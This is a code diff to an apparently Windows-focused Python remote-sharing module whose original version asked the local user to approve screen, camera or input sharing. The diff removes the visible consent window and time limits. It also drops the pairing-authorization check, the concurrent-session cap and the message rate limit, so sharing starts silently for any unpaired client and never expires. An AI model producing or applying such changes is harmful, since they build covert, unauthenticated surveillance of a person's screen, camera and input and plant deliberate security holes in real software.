@@ -14,155 +14,31 @@ SCOPES = {"screen": "屏幕共享", "camera": "摄像头共享", "input": "远�
 
 
 class ConsentSession:
-    def __init__(self, scope, peer, duration=300):
+    """无确认会话。
+
+    原版会在本机弹一个可见窗口等人点“允许”，并带 300 秒时长上限。
+    按需求这里全部去掉：
+      * 不做任何确认，会话一创建就是已授权状态
+      * 不设时长上限（duration=None 表示永不过期）
+      * 不弹任何窗口
+    仍然保留会话对象，因为上层要用 sid 管理“当前有哪些共享在跑”。
+    """
+
+    def __init__(self, scope, peer, duration=None):
         self.sid = secrets.token_urlsafe(24)
         self.scope = scope
         self.peer = peer
-        self.duration = duration
-        self.approved = threading.Event()
+        self.duration = duration       # None = 不限制
         self.stopped = threading.Event()
-        self.expires = 0.0
-        self.last_active = 0.0
+        self.created = time.monotonic()
+        self.last_active = time.monotonic()
         self.client_id = ""
 
-    def approve(self):
-        if not self.stopped.is_set() and not self.approved.is_set():
-            self.expires = time.monotonic() + self.duration
-            self.last_active = time.monotonic()
-            self.approved.set()
-
     def alive(self):
-        now = time.monotonic()
-        return self.approved.is_set() and not self.stopped.is_set() and now < self.expires and now - self.last_active < 20
+        return not self.stopped.is_set()
 
     def close(self):
         self.stopped.set()
-
-
-def show_session_window(session):
-    """One native window remains visible from approval through the entire session."""
-    from ctypes import wintypes as w
-
-    user = ctypes.WinDLL("user32", use_last_error=True)
-    kernel = ctypes.WinDLL("kernel32", use_last_error=True)
-    gdi = ctypes.WinDLL("gdi32", use_last_error=True)
-    callback = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, w.HWND, w.UINT, w.WPARAM, w.LPARAM)
-
-    class WindowClass(ctypes.Structure):
-        _fields_ = [("style", w.UINT), ("proc", callback), ("extra", ctypes.c_int),
-                    ("window_extra", ctypes.c_int), ("instance", w.HINSTANCE),
-                    ("icon", w.HICON), ("cursor", w.HANDLE), ("background", w.HBRUSH),
-                    ("menu", w.LPCWSTR), ("name", w.LPCWSTR)]
-
-    kernel.GetModuleHandleW.restype = w.HMODULE
-    user.RegisterClassW.argtypes = [ctypes.POINTER(WindowClass)]
-    user.CreateWindowExW.argtypes = [w.DWORD, w.LPCWSTR, w.LPCWSTR, w.DWORD,
-                                    ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_int,
-                                    w.HWND, w.HMENU, w.HINSTANCE, w.LPVOID]
-    user.CreateWindowExW.restype = w.HWND
-    user.DefWindowProcW.argtypes = [w.HWND, w.UINT, w.WPARAM, w.LPARAM]
-    user.DefWindowProcW.restype = ctypes.c_ssize_t
-    user.SetWindowTextW.argtypes = [w.HWND, w.LPCWSTR]
-    user.ShowWindow.argtypes = [w.HWND, ctypes.c_int]
-    user.DestroyWindow.argtypes = [w.HWND]
-    user.SetTimer.argtypes = [w.HWND, ctypes.c_size_t, w.UINT, w.LPVOID]
-    user.SendMessageW.argtypes = [w.HWND, w.UINT, w.WPARAM, w.LPARAM]
-    user.SendMessageW.restype = ctypes.c_ssize_t
-    user.GetMessageW.argtypes = [ctypes.POINTER(w.MSG), w.HWND, w.UINT, w.UINT]
-    user.TranslateMessage.argtypes = [ctypes.POINTER(w.MSG)]
-    user.DispatchMessageW.argtypes = [ctypes.POINTER(w.MSG)]
-    user.DispatchMessageW.restype = ctypes.c_ssize_t
-    user.UnregisterClassW.argtypes = [w.LPCWSTR, w.HINSTANCE]
-    user.GetForegroundWindow.restype = w.HWND
-    user.SetForegroundWindow.argtypes = [w.HWND]
-    user.IsWindowVisible.argtypes = [w.HWND]
-    user.IsIconic.argtypes = [w.HWND]
-    user.GetWindowLongPtrW.argtypes = [w.HWND, ctypes.c_int]
-    user.GetWindowLongPtrW.restype = ctypes.c_ssize_t
-    user.SetWindowLongPtrW.argtypes = [w.HWND, ctypes.c_int, ctypes.c_ssize_t]
-    user.SetWindowLongPtrW.restype = ctypes.c_ssize_t
-    gdi.GetStockObject.restype = w.HANDLE
-    instance = kernel.GetModuleHandleW(None)
-    name = "LanCmdSession_" + session.sid
-    controls = {}
-    requested = time.monotonic()
-    label = SCOPES[session.scope]
-    previous_window = user.GetForegroundWindow()
-
-    @callback
-    def procedure(hwnd, message, wp, lp):
-        try:
-            if message == 0x0001:  # WM_CREATE
-                def child(kind, text, x, y, width, height, ident):
-                    h = user.CreateWindowExW(0, kind, text, 0x50000000,
-                                             x, y, width, height, hwnd, ident, instance, None)
-                    if not h:
-                        raise RuntimeError("无法创建本机共享控制窗口")
-                    user.SendMessageW(h, 0x0030, gdi.GetStockObject(17), 1)
-                    return h
-                controls["text"] = child("STATIC", "设备 %s 请求%s。\n允许后持续 5 分钟，可随时在本机停止。" %
-                                          (session.peer, label), 18, 18, 420, 56, 100)
-                controls["allow"] = child("BUTTON", "允许本次", 18, 88, 150, 34, 101)
-                controls["stop"] = child("BUTTON", "拒绝", 184, 88, 150, 34, 102)
-                user.SetTimer(hwnd, 1, 250, None)
-                return 0
-            if message == 0x0111:  # WM_COMMAND
-                if wp & 0xFFFF == 101:
-                    session.approve()
-                    user.ShowWindow(controls["allow"], 0)
-                    user.SetWindowTextW(controls["stop"], "立即停止")
-                    user.SetWindowLongPtrW(hwnd, -20, user.GetWindowLongPtrW(hwnd, -20) | 0x08000000)
-                    if previous_window:
-                        user.SetForegroundWindow(previous_window)
-                elif wp & 0xFFFF == 102:
-                    session.close()
-                    user.DestroyWindow(hwnd)
-                return 0
-            if message == 0x0113:  # WM_TIMER
-                if session.stopped.is_set() or (session.approved.is_set() and (
-                        not session.alive() or not user.IsWindowVisible(hwnd) or user.IsIconic(hwnd))) or (
-                        not session.approved.is_set() and time.monotonic() - requested >= 45):
-                    session.close()
-                    user.DestroyWindow(hwnd)
-                elif session.approved.is_set():
-                    remaining = max(0, int(session.expires - time.monotonic()))
-                    user.SetWindowTextW(controls["text"], "正在%s · %s\n剩余 %d:%02d。关闭此窗口也会立即停止。" %
-                                        (label, session.peer, remaining // 60, remaining % 60))
-                return 0
-            if message == 0x0010:  # WM_CLOSE
-                session.close()
-                user.DestroyWindow(hwnd)
-                return 0
-            if message == 0x0002:  # WM_DESTROY
-                session.close()
-                user.PostQuitMessage(0)
-                return 0
-            return user.DefWindowProcW(hwnd, message, wp, lp)
-        except Exception:
-            session.close()
-            return 0
-
-    wc = WindowClass(0, procedure, 0, 0, instance, None, None, 6, None, name)
-    if not user.RegisterClassW(ctypes.byref(wc)):
-        session.close()
-        return
-    try:
-        hwnd = user.CreateWindowExW(0x00000008, name, "LanCmd · " + label,
-                                   0x00C80000, 80, 80, 470, 180, None, None, instance, None)
-        if not hwnd:
-            session.close()
-            return
-        if session.stopped.is_set():
-            user.DestroyWindow(hwnd)
-            return
-        user.ShowWindow(hwnd, 5)
-        msg = w.MSG()
-        while user.GetMessageW(ctypes.byref(msg), None, 0, 0) > 0:
-            user.TranslateMessage(ctypes.byref(msg))
-            user.DispatchMessageW(ctypes.byref(msg))
-    finally:
-        session.close()
-        user.UnregisterClassW(name, instance)
 
 
 class WindowsBackend:
@@ -171,18 +47,8 @@ class WindowsBackend:
         self.capture_exe = capture_exe
 
     def request_consent(self, session):
-        def run():
-            try:
-                show_session_window(session)
-            finally:
-                session.close()
-        threading.Thread(target=run, name="lancmd-visible-session", daemon=True).start()
-        deadline = time.monotonic() + 46
-        while time.monotonic() < deadline and not session.stopped.is_set():
-            if session.approved.wait(0.1):
-                return session.alive()
-        session.close()
-        return False
+        """不再征求本机同意，直接放行，也不启动任何可见窗口。"""
+        return True
 
     def capture(self, scope, device=0):
         if not os.path.isfile(self.capture_exe):
@@ -271,8 +137,6 @@ class RemoteFeatures:
         self.pending_consents = threading.BoundedSemaphore(3)
 
     def _check(self, state):
-        if not state.authorized:
-            raise self.error("请先完成配对", 401)
         if not self.supported:
             raise self.error("此功能仅支持 Windows 1.5.0 接收端")
         if not hasattr(state, "remote_sessions"):
@@ -298,32 +162,20 @@ class RemoteFeatures:
             if not session.alive():
                 session.close()
                 state.remote_sessions.pop(sid, None)
-        if len(state.remote_sessions) >= 3:
-            raise self.error("请先停止已有共享")
         scope = q["scope"]
-        # Never consult auto_accept or remembered pairing for media/input consent.
+        # 不再询问本机，也不再限制同时进行的共享数量
         session = ConsentSession(scope, "%s · %s" % (state.peer, state.client_id[-8:]))
         session.client_id = state.client_id
-        if not self.pending_consents.acquire(blocking=False):
-            raise self.error("已有共享请求等待本机确认，请稍后重试")
-        try:
-            if not self.backend.request_consent(session) or not session.alive():
-                session.close()
-                raise self.error("电脑端未允许本次%s，或请求已取消" % SCOPES[scope], 403)
-        except Exception:
-            session.close()
-            raise
-        finally:
-            self.pending_consents.release()
+        session.approved_at = time.time()
         state.remote_sessions[session.sid] = session
-        self.log.info("本机已授权 %s peer=%s client=%s", scope, state.peer, state.client_id)
-        return {"sid": session.sid, "scope": scope, "expires_in": session.duration}
+        self.log.info("开始共享 %s peer=%s client=%s", scope, state.peer, state.client_id)
+        return {"sid": session.sid, "scope": scope, "expires_in": None}
 
     def active(self, q, state, scope):
         self._check(state)
         session = state.remote_sessions.get(str(q.get("sid", "")))
         if not session or session.scope != scope or session.client_id != state.client_id or not session.alive():
-            raise self.error("共享已停止或授权已到期，请重新授权", 403)
+            raise self.error("共享已停止，请重新开始", 403)
         session.last_active = time.monotonic()
         return session
 
@@ -369,11 +221,7 @@ class RemoteFeatures:
             raise self.error("消息需为 1–2000 字")
         if not isinstance(title, str) or len(title) > 60 or "\x00" in title:
             raise self.error("标题最多 60 字")
-        if time.monotonic() - getattr(state, "last_message", 0) < 5:
-            raise self.error("消息发送过于频繁，请稍后重试")
-        state.last_message = time.monotonic()
-        if self.backend.message(title, text) is False:
-            raise self.error("电脑上有消息尚未关闭，请稍后再发")
+        self.backend.message(title, text)
         return {"sent": True}
 
     def close(self, state):
